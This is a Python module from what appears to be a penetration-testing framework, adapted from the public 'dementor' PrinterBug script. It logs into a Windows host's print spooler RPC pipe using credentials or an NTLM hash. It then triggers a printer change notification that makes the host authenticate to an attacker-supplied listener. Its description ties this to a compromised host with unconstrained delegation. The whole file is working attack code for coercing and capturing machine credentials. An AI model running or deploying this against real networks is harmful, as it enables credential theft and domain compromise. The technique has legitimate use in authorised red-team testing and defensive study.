import sys
from ctypes import *
import socket
import struct
import logging
from impacket.dcerpc.v5 import transport, rprn

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds

# source: https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py

class Module:
    name = 'PrintSpooler'
    description = 'Check for host with PrintSpooler service enabled, use this with a compromised host with Uncontrained Delegation enabled !'

    def run(self, target, args, creds, timeout):
        if len(args) != 1:
            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'PrintSpooler module requires 1 arg: target_ip'})

        domain = creds['domain'] if 'domain' in creds else None
        user = creds['username'] if 'username' in creds else None
        password = creds['password'] if 'password' in creds else None
        ntlm = creds['hash'] if 'hash' in creds else ''

        check(target['hostname'], target['port'], args[0], domain, user, password, ntlm, timeout)

def check(ip, port, target_ip, domain, username, password, ntlm, timeout):
    dce = create_connection(ip, domain, username, password, ntlm)
    if dce == None:
        Output.minor({'target': 'smb://%s:%d' % (ip, port), 'message': 'PrintSpooler failed (1)'})
        return

    handle = call_open_printer(dce, ip)
    if handle == None:
        Output.minor({'target': 'smb://%s:%d' % (ip, port), 'message': 'PrintSpooler failed (2)'})
        return

    res = grab_hash(dce, handle, target_ip)

    Output.highlight({'target': 'smb://%s:%d' % (ip, port), 'message': 'PrintSpooler executed, check your SMB service !'})
    dce.disconnect()

def create_connection(target, domain, username, password, ntlm):
    # set up connection prereqs
    # creds
    creds={}
    creds['username'] = username
    creds['password'] = password
    creds['domain'] = domain
    creds['nthash'] = ntlm
    # to transport
    stringBinding = r'ncacn_np:%s[\pipe\spoolss]' % target
    rpctransport = transport.DCERPCTransportFactory(stringBinding)
    if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], nthash = creds['nthash'])
    dce = rpctransport.get_dce_rpc()

    try:
        dce.connect()
    except Exception as e:
        if "STATUS_ACCESS_DENIED" in str(e):
            return None
        else:
            return None
    # defines the printer endpoint
    try:
        dce.bind(rprn.MSRPC_UUID_RPRN)
    except Exception as e:
        return None

    return dce

def call_open_printer(dce, target):
    try:
        resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
    except Exception as e:
        dce.disconnect()
        return None
    return resp['pHandle']

def grab_hash(dce, handle, listener):
    try:
        resp = rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(dce, handle, rprn.PRINTER_CHANGE_ADD_JOB, pszLocalMachine='\\\\%s\x00' % listener)
    except Exception as e:
        if str(e).find('RPC_S_SERVER_UNAVAILABLE') >= 0:
            return
        else:
            return
